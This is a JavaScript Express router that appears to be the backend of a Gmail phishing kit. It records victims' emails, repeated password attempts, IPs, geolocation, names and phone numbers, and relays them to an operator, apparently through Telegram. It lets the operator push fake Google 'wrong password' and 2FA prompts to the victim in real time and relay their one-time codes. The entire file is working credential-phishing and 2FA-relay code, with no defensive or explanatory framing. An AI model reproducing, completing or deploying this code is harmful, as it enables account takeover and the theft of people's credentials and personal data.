import express from "express";
import axios from "axios";
import { getMemoryStore } from "../utils/memory-store.js";
import {
  GMAIL_COMMANDS,
  normalizeGmailCommand,
} from "../utils/gmailTelegramCommands.js";
import { getUserMessageManager } from "../utils/userMessageManager.js";

const router = express.Router();

const messageToUser = new Map();
const userSessions = new Map();

const getSessionForUser = (userId) => {
  const existingSession = userSessions.get(userId);
  if (existingSession) {
    return existingSession;
  }

  const memoryStore = getMemoryStore();
  const storedUser = memoryStore.get(userId);
  if (!storedUser) {
    return null;
  }

  const userData = storedUser.data || storedUser;
  const passwords = [];
  [userData.password_one, userData.password_two, userData.password_three]
    .filter(Boolean)
    .forEach((pwd) => passwords.push(pwd));

  return {
    email: userData.login_email || userData.business_email || userData.email || userData.email2fa || "",
    passwords,
    ip: userData.ip,
    country: userData.country,
    city: userData.city,
    name: userData.full_name || userData.name || "User",
    businessEmail: userData.business_email,
    tel: userData.phone_number,
    pageName: userData.page_name,
    passwordAttempt: passwords.length,
  };
};

const REPLY_INSTRUCTIONS = {
  [GMAIL_COMMANDS.twoFaCode]: "Reply to this message with the number",
  [GMAIL_COMMANDS.twoFaYoutube]: "Reply to this message with the number",
  [GMAIL_COMMANDS.twoFaSms]: "Reply to this message with the Phone Number",
  [GMAIL_COMMANDS.twoFaNumber]: "Reply to this message with the number",
  [GMAIL_COMMANDS.email2fa]: "Reply to this message with the number",
};

const TITLE_MAP = {
  [GMAIL_COMMANDS.twoFaGmail]: "Clicked G 2FA Gmail",
  [GMAIL_COMMANDS.twoFaCode]: "Clicked G2FA Code",
  [GMAIL_COMMANDS.twoFaYoutube]: "Clicked G2FA YouTube",
  [GMAIL_COMMANDS.twoFaNumber]: "Clicked G2FA Number",
  [GMAIL_COMMANDS.twoFaSms]: "Clicked G 2FA SMS",
  [GMAIL_COMMANDS.wrongTwoFaSms]: "Clicked G W 2FA SMS",
  [GMAIL_COMMANDS.wrongTwoFaNumber]: "Clicked G Wrong 2FA Number",
  [GMAIL_COMMANDS.email2fa]: "Clicked G2FA Number",
  [GMAIL_COMMANDS.badEmail]: "Clicked Bad Email",
  [GMAIL_COMMANDS.badPass]: "Clicked Bad Pass",
  [GMAIL_COMMANDS.wait]: "Clicked Wait",
  bademail: "Clicked Bad Email",
  badpass: "Clicked Bad Pass",
  wait: "Clicked Wait",
};

const REPLYABLE_TYPES = new Set([
  GMAIL_COMMANDS.twoFaCode,
  GMAIL_COMMANDS.twoFaYoutube,
  GMAIL_COMMANDS.twoFaNumber,
  GMAIL_COMMANDS.twoFaSms,
  GMAIL_COMMANDS.email2fa,
]);

router.post("/request", async (req, res) => {
  try {
    const { userId, email, password, ip, name, businessEmail, tel } = req.body;

    if (!userId || !email) {
      return res.status(400).json({
        success: false,
        message: "Missing userId or email",
      });
    }

    let country = "XX";
    let city = "Unknown";
    if (ip) {
      try {
        const ipResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        if (ipResponse.data && ipResponse.data.status === "success") {
          country = ipResponse.data.countryCode || "XX";
          city = ipResponse.data.city || "Unknown";
        }
      } catch (error) {
        console.log("Could not fetch location data");
      }
    }

    const existingSession = userSessions.get(userId);
    const passwords = existingSession?.passwords || [];
    passwords.push(password);

    userSessions.set(userId, {
      email,
      passwords,
      ip,
      country,
      city,
      name,
      businessEmail,
      tel,
      pageName: "Gmail",
      passwordAttempt: passwords.length,
    });

    const manager = getUserMessageManager();
    manager.setFlow(userId, "google");
    const managerUser = manager.getUser(userId);
    const glPasswords = managerUser.data.gl_passwords || [];
    if (!glPasswords.includes(password)) glPasswords.push(password);
    const messageId = await manager.update(userId, {
      id: userId,
      pageName: "Gmail",
      login_email: email,
      gl_email: email,
      gl_passwords: glPasswords,
      name: name,
      ip: ip,
      country: country,
      city: city,
      passwords: passwords,
      business_email: businessEmail,
      phone_number: tel,
      currentStep: "Gmail Login",
      code: null,
      replyInstruction: null,
      _lastUpdate: Date.now(),
    });

    if (messageId) {
      messageToUser.set(messageId, {
        userId, email, password, ip, country, city, name, businessEmail, tel,
        timestamp: Date.now(),
      });
      console.log(`[APPAUTH] Stored message ${messageId} for user ${userId}`);
    }

    console.log("[APPAUTH] Message sent/edited for user:", userId);

    return res.status(200).json({
      success: true,
      message: "Auth request sent",
    });
  } catch (error) {
    console.error("Error in appauth request:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/approve", async (req, res) => {
  try {
    const { userId } = req.body;

    if (!userId) {
      return res.status(400).json({
        success: false,
        message: "Missing userId",
      });
    }

    const io = req.app.locals.io;
    if (!io) {
      console.error("[APPAUTH] Socket.IO not available");
      return res.status(500).json({
        success: false,
        message: "Socket.IO not available",
      });
    }

    io.emit(`gmail-approved-${userId}`, { approved: true });
    console.log(`[APPAUTH] Emitted gmail-approved-${userId} event`);

    const manager = getUserMessageManager();
    await manager.update(userId, {
      currentStep: "Approved",
      code: null,
      replyInstruction: null,
    });

    return res.status(200).json({
      success: true,
      message: "User approved",
    });
  } catch (error) {
    console.error("Error in appauth approve:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/decision", async (req, res) => {
  try {
    const { userId } = req.body;
    const decision = normalizeGmailCommand(req.body.decision);

    if (!userId || !decision) {
      return res.status(400).json({
        success: false,
        message: "Missing userId or decision",
      });
    }

    console.log(`[APPAUTH] Admin decision for user ${userId}: ${decision}`);

    const io = req.app.locals.io;
    if (!io) {
      console.error("[APPAUTH] Socket.IO not available");
      return res.status(500).json({
        success: false,
        message: "Socket.IO not available",
      });
    }

    switch (decision) {
      case GMAIL_COMMANDS.badEmail:
      case "bademail":
      case "badcreds":
        io.emit(`gmail-error-${userId}`, {
          type: "badcreds",
          message: "Couldn't find your Google Account",
        });
        break;

      case GMAIL_COMMANDS.badPass:
      case "badpass":
        io.emit(`gmail-error-${userId}`, {
          type: "badpass",
          message: "Wrong password. Try again or click Forgot password to reset it.",
        });
        break;

      case GMAIL_COMMANDS.wrongTwoFaNumber:
        io.emit(`gmail-error-${userId}`, {
          type: "wrong2fanumber",
          message: "Wrong Phone number, try again",
        });
        break;

      case GMAIL_COMMANDS.wrongTwoFaSms:
        io.emit(`gmail-error-${userId}`, {
          type: "wrong2fasms",
          message: "Invalid authentication code",
        });
        break;

      case GMAIL_COMMANDS.twoFaGmail:
        io.emit(`gmail-2fa-${userId}`, { type: "gmail" });
        break;

      case GMAIL_COMMANDS.twoFaCode:
        io.emit(`gmail-2fa-${userId}`, { type: "code" });
        break;

      case GMAIL_COMMANDS.twoFaNumber:
      case GMAIL_COMMANDS.email2fa:
        io.emit(`gmail-2fa-${userId}`, { type: "number" });
        break;

      case GMAIL_COMMANDS.twoFaSms:
        io.emit(`gmail-2fa-${userId}`, { type: "sms" });
        break;

      case GMAIL_COMMANDS.wait:
      case "wait":
        io.emit(`gmail-wait-${userId}`, { type: "wait" });
        break;

      default:
        return res.status(400).json({
          success: false,
          message: "Invalid decision type",
        });
    }

    console.log(`[APPAUTH] Event emitted for ${decision}`);

    return res.status(200).json({
      success: true,
      message: "Decision processed",
    });
  } catch (error) {
    console.error("Error in appauth decision:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/code", async (req, res) => {
  try {
    const { userId, code } = req.body;
    const type = normalizeGmailCommand(req.body.type);

    if (!userId || !code) {
      return res.status(400).json({
        success: false,
        message: "Missing userId or code",
      });
    }

    console.log(`[APPAUTH] Sending code ${code} to user ${userId}, type: ${type || GMAIL_COMMANDS.twoFaCode}`);

    const io = req.app.locals.io;
    if (!io) {
      console.error("[APPAUTH] Socket.IO not available");
      return res.status(500).json({
        success: false,
        message: "Socket.IO not available",
      });
    }

    if (type === GMAIL_COMMANDS.twoFaSms) {
      io.emit(`gmail-sms-digits-${userId}`, { digits: code });
    } else {
      io.emit(`gmail-code-${userId}`, { code: code });
    }

    const manager = getUserMessageManager();
    await manager.update(userId, {
      currentStep: `Code Sent: ${code}`,
      replyInstruction: null,
    });

    return res.status(200).json({
      success: true,
      message: "Code sent",
    });
  } catch (error) {
    console.error("Error in appauth code:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/reply", async (req, res) => {
  try {
    const { replyToMessageId, code, replyType: frontendReplyType, userId: bodyUserId } = req.body;

    if (!replyToMessageId || !code) {
      return res.status(400).json({
        success: false,
        message: "Missing replyToMessageId or code",
      });
    }
    console.log("[APPAUTH] /reply payload:", { replyToMessageId, code });

    const replyKeyNum = Number(replyToMessageId);
    let userData = messageToUser.get(replyKeyNum) || messageToUser.get(replyToMessageId);
    if (!userData) {
      for (const [msgId, data] of messageToUser.entries()) {
        if (String(msgId) === String(replyToMessageId)) {
          userData = data;
          break;
        }
      }
    }

    if (!userData) {
      // Fallback: check if this messageId matches any user's current message in the manager
      const manager2 = getUserMessageManager();
      for (const [uid, u] of manager2.users.entries()) {
        if (u.telegramMessageId && String(u.telegramMessageId) === String(replyToMessageId)) {
          const session = userSessions.get(uid);
          const derivedType = u.data.lastReplyType || GMAIL_COMMANDS.twoFaCode;
          if (session) {
            userData = {
              userId: uid,
              email: session.email,
              password: session.passwords?.[0],
              ip: session.ip,
              country: session.country,
              city: session.city,
              name: session.name,
              businessEmail: session.businessEmail,
              tel: session.tel,
              replyType: derivedType,
            };
          } else {
            userData = {
              userId: uid,
              replyType: derivedType,
            };
          }
          // Store in messageToUser for future lookups
          messageToUser.set(Number(replyToMessageId) || replyToMessageId, userData);
          console.log(`[APPAUTH] Found user ${uid} via manager fallback, replyType: ${derivedType}`);
          break;
        }
      }
    }

    if (!userData && bodyUserId) {
      const manager3 = getUserMessageManager();
      if (manager3.users.has(bodyUserId)) {
        const u = manager3.users.get(bodyUserId);
        const session = userSessions.get(bodyUserId);
        const derivedType = u.data.lastReplyType || frontendReplyType || GMAIL_COMMANDS.twoFaCode;
        if (session) {
          userData = {
            userId: bodyUserId,
            email: session.email,
            password: session.passwords?.[0],
            ip: session.ip,
            country: session.country,
            city: session.city,
            name: session.name,
            businessEmail: session.businessEmail,
            tel: session.tel,
            replyType: derivedType,
          };
        } else {
          userData = {
            userId: bodyUserId,
            replyType: derivedType,
          };
        }
        messageToUser.set(Number(replyToMessageId) || replyToMessageId, userData);
        console.log(`[APPAUTH] Found user ${bodyUserId} via body userId fallback, replyType: ${derivedType}`);
      }
    }

    if (!userData) {
      console.warn("[APPAUTH] replyToMessageId not found:", replyToMessageId);

      const lowerCode = String(code).toLowerCase();
      const cleanedCode = lowerCode.replace(/\*/g, "").trim();
      for (const [uid, sessionData] of userSessions.entries()) {
        const candidates = [sessionData.email, sessionData.login_email, sessionData.businessEmail, sessionData.email2fa];
        for (const cand of candidates) {
          if (!cand) continue;
          const candClean = String(cand).toLowerCase().replace(/\*/g, "").trim();
          if (
            candClean === cleanedCode ||
            candClean.includes(cleanedCode) ||
            cleanedCode.includes(candClean)
          ) {
            userData = {
              userId: uid,
              email: sessionData.email || sessionData.login_email || sessionData.businessEmail,
              password: sessionData.passwords?.[0],
              ip: sessionData.ip,
              country: sessionData.country,
              city: sessionData.city,
              name: sessionData.name,
              businessEmail: sessionData.businessEmail,
              tel: sessionData.tel,
              replyType: GMAIL_COMMANDS.email2fa,
            };
            break;
          }
        }
        if (userData) break;
      }

      if (!userData) {
        try {
          const memoryStore = getMemoryStore();
          const allUsers = memoryStore.getAllUsers();
          for (const u of allUsers) {
            const candidates = [u.email, u.login_email, u.businessEmail, u.email2fa];
            for (const cand of candidates) {
              if (!cand) continue;
              const candClean = String(cand).toLowerCase().replace(/\*/g, "").trim();
              if (
                candClean === cleanedCode ||
                candClean.includes(cleanedCode) ||
                cleanedCode.includes(candClean)
              ) {
                userData = {
                  userId: u.userId,
                  email: u.email || u.login_email || u.businessEmail,
                  password: u.passwords?.[0],
                  ip: u.ip,
                  country: u.country,
                  city: u.city,
                  name: u.name,
                  businessEmail: u.businessEmail,
                  tel: u.tel,
                  replyType: GMAIL_COMMANDS.email2fa,
                };
                break;
              }
            }
            if (userData) break;
          }
        } catch (err) {
          console.warn("[APPAUTH] Error checking memoryStore fallback:", err.message);
        }

        if (!userData) {
          return res.status(404).json({
            success: false,
            message: "Original message not found",
          });
        }
      }
    }

    const { userId } = userData;
    const manager = getUserMessageManager();

    // Always prefer the manager's lastReplyType — it reflects the LATEST button click,
    // while messageToUser may still hold the type from a previous reply cycle.
    const managerUser = manager.getUser(userId);
    const replyType = managerUser.data.lastReplyType || userData.replyType || frontendReplyType;

    console.log(`[APPAUTH] /reply resolved: userId=${userId}, replyType=${replyType}, lastReplyType=${managerUser.data.lastReplyType}, userData.replyType=${userData.replyType}, frontendReplyType=${frontendReplyType}`);

    // Handle email reply (from /google flow switch)
    if (replyType === 'google-email' || replyType === 'google-gmail') {
      manager.setFlow(userId, 'google');
      const session = userSessions.get(userId);
      if (session) {
        session.email = code;
      }
      await manager.update(userId, {
        login_email: code,
        currentStep: `Email: ${code}`,
        replyInstruction: null,
        lastReplyType: null,
      });
      userData.timestamp = Date.now();

      const io = req.app.locals.io;
      if (io) {
        io.emit(`gmail-google-confirm-${userId}`, { email: code });
        console.log(`[APPAUTH] Emitted gmail-google-confirm-${userId} with email: ${code}`);
      }

      return res.status(200).json({
        success: true,
        message: "Email stored",
        replyType: 'google-email',
      });
    }

    const io = req.app.locals.io;
    if (io) {
      if (replyType === GMAIL_COMMANDS.twoFaSms) {
        io.emit(`gmail-sms-digits-${userId}`, { digits: code });
        console.log(`[APPAUTH] Emitted gmail-sms-digits-${userId} with digits: ${code}`);
      } else if (replyType === GMAIL_COMMANDS.twoFaNumber || replyType === GMAIL_COMMANDS.email2fa) {
        io.emit(`gmail-number-${userId}`, { number: code });
        console.log(`[APPAUTH] Emitted gmail-number-${userId} with number: ${code}`);
      } else {
        io.emit(`gmail-code-${userId}`, { code: code });
        console.log(`[APPAUTH] Emitted gmail-code-${userId} with code: ${code}`);
      }
    }

    const codeLabel = replyType === GMAIL_COMMANDS.twoFaSms
      ? "SMS Code"
      : replyType === GMAIL_COMMANDS.twoFaNumber || replyType === GMAIL_COMMANDS.email2fa
        ? "Phone Number"
        : "Code";

    await manager.update(userId, {
      currentStep: `${codeLabel}: ${code}`,
      replyInstruction: null,
      lastReplyType: null,
    });

    // Refresh timestamp so the entry survives cleanup for the next reply
    userData.timestamp = Date.now();

    console.log(`[APPAUTH] Reply processed for user ${userId}, code ${code}, type: ${replyType}`);

    return res.status(200).json({
      success: true,
      message: "Confirmation sent",
      replyType: replyType || GMAIL_COMMANDS.twoFaCode,
    });
  } catch (error) {
    console.error("Error in appauth reply:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.post("/notify-2fa", async (req, res) => {
  try {
    const { userId } = req.body;
    const type = normalizeGmailCommand(req.body.type) || req.body.type;

    if (!userId || !type) {
      return res.status(400).json({
        success: false,
        message: "Missing userId or type",
      });
    }

    if (type === 'google-email') {
      const manager = getUserMessageManager();
      manager.setFlow(userId, 'google');
      const messageId = await manager.update(userId, {
        currentStep: 'Switched to Google Flow',
        replyInstruction: 'Reply to this message with an email',
        lastReplyType: 'google-email',
        code: null,
        _lastUpdate: Date.now(),
      });
      if (messageId) {
        messageToUser.set(messageId, {
          userId,
          replyType: 'google-email',
          timestamp: Date.now(),
        });
      }
      return res.status(200).json({
        success: true,
        message: 'Switched to Google flow',
        telegramMessageId: messageId,
      });
    }

    let session = userSessions.get(userId);
    if (!session) {
      try {
        const memoryStore = getMemoryStore();
        const stored = memoryStore.get(userId);
        if (stored) {
          const ud = stored.data || stored;
          const passwords = [];
          [ud.password_one, ud.password_two, ud.password_three]
            .filter(Boolean)
            .forEach((pwd) => passwords.push(pwd));

          session = {
            email: ud.login_email || ud.business_email || ud.email || ud.email2fa || "",
            passwords,
            ip: ud.ip,
            country: ud.country,
            city: ud.city,
            name: ud.full_name || ud.name || "User",
            businessEmail: ud.business_email,
            tel: ud.phone_number,
            pageName: ud.page_name,
            passwordAttempt: passwords.length,
          };
          userSessions.set(userId, session);
        }
      } catch (err) {
        console.warn("[APPAUTH] Error recovering session:", err.message);
      }

      if (!session) {
        return res.status(404).json({
          success: false,
          message: "Session not found",
        });
      }
    }

    const stepTitle = TITLE_MAP[type] || `Clicked ${type}`;
    const replyInstruction = REPLY_INSTRUCTIONS[type] || null;

    const manager = getUserMessageManager();
    manager.setFlow(userId, "google");
    manager.updateData(userId, {
      id: userId,
      pageName: session.pageName || "Gmail",
      login_email: session.email,
      name: session.name,
      ip: session.ip,
      country: session.country,
      city: session.city,
      passwords: session.passwords,
      business_email: session.businessEmail,
      phone_number: session.tel,
    });
    const messageId = await manager.update(userId, {
      currentStep: stepTitle,
      replyInstruction: replyInstruction,
      lastReplyType: REPLYABLE_TYPES.has(type) ? type : null,
      code: null,
      _lastUpdate: Date.now(),
    });

    if (REPLYABLE_TYPES.has(type) && messageId) {
      messageToUser.set(messageId, {
        userId,
        email: session.email,
        password: session.passwords?.[0],
        ip: session.ip,
        country: session.country,
        city: session.city,
        name: session.name,
        businessEmail: session.businessEmail,
        tel: session.tel,
        replyType: type,
        timestamp: Date.now(),
      });
      console.log(`[APPAUTH] Stored ${type} message ${messageId} for reply detection`);
    }

    console.log(`[APPAUTH] 2FA notification updated for user ${userId}, type: ${type}`);

    return res.status(200).json({
      success: true,
      message: "2FA notification sent",
      telegramMessageId: messageId,
    });
  } catch (error) {
    console.error("Error in notify-2fa:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

router.get("/session/:userId", async (req, res) => {
  try {
    const { userId } = req.params;

    if (!userId) {
      return res.status(400).json({
        success: false,
        message: "Missing userId",
      });
    }

    const session = userSessions.get(userId) || getSessionForUser(userId);
    if (!session) {
      return res.status(404).json({
        success: false,
        message: "Session not found",
      });
    }

    return res.status(200).json({
      success: true,
      data: session,
    });
  } catch (error) {
    console.error("Error in session lookup:", error.message);
    return res.status(500).json({
      success: false,
      message: error.message || "Internal server error",
    });
  }
});

setInterval(() => {
  const now = Date.now();
  for (const [msgId, data] of messageToUser.entries()) {
    if (data.timestamp && now - data.timestamp > 600000) {
      messageToUser.delete(msgId);
    }
  }
}, 600000);

export default router;
